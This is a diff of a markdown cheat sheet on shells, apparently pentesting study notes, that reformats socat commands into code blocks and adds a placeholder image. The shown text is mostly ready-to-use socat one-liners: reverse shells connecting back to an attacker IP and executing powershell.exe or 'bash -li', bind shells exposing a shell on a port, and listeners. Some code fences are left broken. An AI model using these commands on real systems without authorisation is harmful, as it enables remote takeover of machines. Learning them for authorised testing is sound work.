@@ -21,6 +21,11 @@
     <img width="500" src="https://silviavali.github.io/assets/img/SLAE/bindreverse.png" alt="Material Bread logo">
 </p>
 
+<div style="background-color: #222222; padding: 10px; display: inline-block;">
+  ![Your Image Description](your-image-url.png)
+</div>
+
+
 ## Reverse Shell
 ### On the attacking machine
 ```bash
@@ -48,20 +53,35 @@ Socat is similar to Netcat. It works as a connector between two points.
 
 ## Reverse Shells
 ### Syntax for A Listener/Attacker
-* `socat TCP-L:<port> -` [ Two points (a listening port, and standard input) and connecting them together]
+```bash
+socat TCP-L:<port> -
+```
+Connects Two points (a listening port, and standard input)
   
 ###  To Connect Back on A Windows Target
-* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` [The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.]
+```bash
+$socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+# The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output
+```
+
 ###  To Connect Back on A Linux Target
 * `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
 
 ## Bind Shells
 ### On A Linux Target
-* `socat TCP-L:<PORT> EXEC:"bash -li"`
+```bash
+`socat TCP-L:<PORT> EXEC:"bash -li"
+```
+
 ### On A Windows Target
-* `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
+```bash
+`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
+```bash
+
 ### Attacker (Regardless of target platform)
-* `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
+```bash
+ `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
+```
 
 ## A Fully Stable TTY Reverse Shell Using Socat
 ```bash
